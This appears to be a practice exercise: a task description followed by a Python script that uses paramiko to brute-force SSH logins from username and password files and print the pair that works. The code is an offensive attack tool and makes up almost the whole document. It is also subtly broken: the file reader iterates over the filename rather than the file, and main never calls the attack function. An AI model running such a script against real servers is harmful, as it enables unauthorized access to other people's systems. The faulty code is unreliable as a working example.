'''
7. Basic Brute Force Attack Script

Create a script to perform a basic brute force attack on an SSH server.

Task:

    Attempt to login to an SSH server using a list of usernames and passwords.
    Print out the correct username and password if found.

Hint: Use the paramiko library for SSH connections.
'''


import paramiko

def read_file(file):
    with open (file, 'r') as f:
        return [line.strip() for line in file]
    

def Brute(ip, port, username, password):
    for user in username:
        for passwd in password:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(ip, port, user, passwd)
                print(f"[*] Success: Username: {user} | Password: {passwd}")
                ssh.close()
                return
            except paramiko.AuthenticationException:
                print(f"[!] Failed: Username: {user} | Password: {passwd}")
            except paramiko.SSHException as sshException:
                print(f"[!] SSH error: {sshException}")
            except Exception as e:
                print(f"[!] Error: {e}")


def main():
    ip = input("Enter IP Address: ")
    port= 22

    user_file = "username.txt"
    pass_file = "password.txt"

    username = read_file(user_file)
    password = read_file(pass_file)